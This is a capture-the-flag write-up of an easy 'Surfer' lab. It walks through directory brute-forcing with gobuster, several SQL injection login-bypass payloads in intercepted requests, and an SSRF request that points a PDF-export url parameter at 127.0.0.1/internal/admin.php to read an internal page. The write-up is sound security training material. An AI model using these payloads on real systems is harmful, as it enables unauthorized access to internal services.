<h1 align="center">Challenge 034 - Surfer </h1>
<div align="center">
  <img <img src="https://github.com/user-attachments/assets/7b6dc94b-8ced-4e84-88d7-f5a99614860a" alt="Surfer" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 2/10 (Easy) <b>Completed</b>: ✔️ 06.10.2025 </p>

This is a challenge, which gets you acquainted with exploits like Server-Side Request Forgeries (SSRF), which allows us to access internal server resources. We will have the opportunity to check out an app, which has functionalities that are only available for internal usage. Let's dive into it.

When we navigate to the URL we see a login page.

<img width="341" height="554" alt="image" src="https://github.com/user-attachments/assets/46538247-97fb-4340-ae70-316109abe72b" />

Just to make sure I bruteforced to see if there are some other directories.

```
root@ip-10-10-219-16:~# gobuster dir -u http://10.10.15.215 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.215
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.15.215/assets/]
/backup               (Status: 301) [Size: 313] [--> http://10.10.15.215/backup/]
/index.php            (Status: 302) [Size: 0] [--> /login.php]
/internal             (Status: 301) [Size: 315] [--> http://10.10.15.215/internal/]
/robots.txt           (Status: 200) [Size: 40]
/server-status        (Status: 403) [Size: 277]
/vendor               (Status: 301) [Size: 313] [--> http://10.10.15.215/vendor/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The hunch was right, but it doesn't seem like we are able to visit any of these rooms. 

The next step was trying to work with tools like Burp Suite to check out how our Requests may are being modified. When I tried the basic SQL injection we can see how the input is being sanitized in Burp Suite

```
POST /verify.php HTTP/1.1
Host: 10.10.15.215
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.10.15.215
Connection: keep-alive
Referer: http://10.10.15.215/login.php
Cookie: PHPSESSID=46d1908a9c2f127de7d893fe15ec95a4
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=%27OR+1%3D1--+-&password=test
```

Which makes the bypassing of the login next to impossible. We try other payloads with different quotes

```
username="OR 1=1--"&password=test
```

and even some commenting techniques 

```
username=%27OR+1=1/*&password=test
```

None of that helped though. After some time I realized I didn't check out the robots.txt. That was my bad

<img width="205" height="44" alt="image" src="https://github.com/user-attachments/assets/4ab88c1e-af8c-4868-9948-317aaa9820b7" />

So there IS another directory we can check out.

<img width="649" height="250" alt="image" src="https://github.com/user-attachments/assets/7486d4f0-8931-4498-8fb5-00cb7106a5cb" />

Looking at it, we know the credentials of the admin now and can log in. Having done that we can see a Dashboard

<img width="974" height="836" alt="image" src="https://github.com/user-attachments/assets/488e808c-353f-46b0-a43c-d796b0050972" />

Scrolling down the website we get some Hosting Server Information, updates about recent activities and website traffic. There even is the possibility to export the reports to PDF through a button prompt. When checking out the recent activity we also get a clue where the flag might be hidden

<img width="647" height="296" alt="image" src="https://github.com/user-attachments/assets/ca2523a5-5821-45ba-b987-4ac34a003d85" />

We can try to change the given url accordingly: *10.10.240.81/internal/admin.php*, but then we are given the following notification.

<img width="496" height="157" alt="image" src="https://github.com/user-attachments/assets/51bba2ae-f494-42b5-9902-b3e0f724c7bf" />

As we don't have any knowledge of where the target server really resides in we click on the "Export to PDF" button just to see what kind of information come out of it

<img width="969" height="826" alt="Bildschirmfoto vom 2025-10-06 15-50-56" src="https://github.com/user-attachments/assets/b30f082c-a5ae-45c8-95e4-6c0a7937898f" />

Now the IP-address of the target server is evident. 
As the challenge was explicitly stating that an attacker could be able to send crafted requests from a vulnerable server to internal or external resources, bypassing client-side restrictions we use Burp Suite to check what happens if we click on the "Export to PDF" button and intercept the request.

```
POST /export2pdf.php HTTP/1.1
Host: 10.10.240.81
Content-Length: 44
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://10.10.240.81
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.240.81/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cc4759857e2ad8b56d019f770db8c6d4
Connection: keep-alive

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

I changed the url parameter to *url=http://127.0.0.1/internal/admin.php* in hopes of getting the flag.

<img width="682" height="170" alt="Bildschirmfoto vom 2025-10-06 15-45-26" src="https://github.com/user-attachments/assets/44432ea5-fbd9-44a3-b34e-557484d3545c" />

And we are successful. This room is a very easy way to get acquainted with vulnerabilities like Server-Side Request Forgery and make the logic behind what goes on digestible. I hope we can get to something more challenging next time around. 
